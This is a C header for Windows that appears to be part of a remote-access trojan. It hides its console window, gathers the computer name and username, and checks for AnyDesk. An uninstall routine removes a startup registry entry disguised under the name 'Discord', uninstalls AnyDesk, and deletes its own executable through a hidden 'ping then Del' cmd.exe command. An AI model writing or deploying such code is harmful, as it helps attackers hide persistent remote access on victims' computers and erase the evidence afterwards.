#pragma once

#include <stdio.h>
#include <Windows.h>
#include <string.h>
#include <openssl/md5.h>
#include <stdbool.h>
#include "AnyDeskFile.h"
#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q \"%s\"")


// Functions
int startsWith(const char* a, const char* b);
struct PcDetails getPcDetails();
void hideConsoleWindow();

struct PcDetails {
    char computerName[15 + 1]; // The maximum length of computer name is 15 characters + \0 
    char userName[256 + 1]; // The maximum length of computer name is 256 characters + \0 
    int isAnyDeskInstalled; // 2 is true 0 is false,
};

int startsWith(const char *a, const char *b)
{
    if (strncmp(a, b, strlen(b)) == 0)
        return 0;
    return 1;
}

struct PcDetails getPcDetails() {
    /*
    Returns pc details
    */

    struct PcDetails pcDetails;

    char computerName[15 + 1];
    char username[256 + 1];
    DWORD  bufCharCount = sizeof(computerName);
    DWORD  bufCharCount2 = sizeof(username);
      
    // Gets the computer name
    while (GetComputerNameA(computerName, &bufCharCount) == 0) {
        printf("Can't get the computer name %d, try again in 1 minute!", GetLastError());
        Sleep(60000);
    }

    // Gets the username
    while (GetUserNameA(username, &bufCharCount2) == 0) {
        printf("Can't get the username %d, try again in 1 minute!", GetLastError());
        Sleep(60000);
    }

    strcpy_s(pcDetails.computerName, sizeof(pcDetails.computerName), computerName);
    strcpy_s(pcDetails.userName, sizeof(pcDetails.userName), username);

    // Checks if anydesk is installed:
    pcDetails.isAnyDeskInstalled = isTheAnyDeskFile(anyDeskFilePath);

    return pcDetails;
}

void hideConsoleWindow()
{
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}

void uninstallProgram() {
    RemoveMyProgramFromStartup(L"Discord");
    printf("Sucessfully delted from registery!\n");
    uninstallAnyDesk();
    printf("Sucessfully deleted anydesk file and appdata directory!\n");

    // Self destruction
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}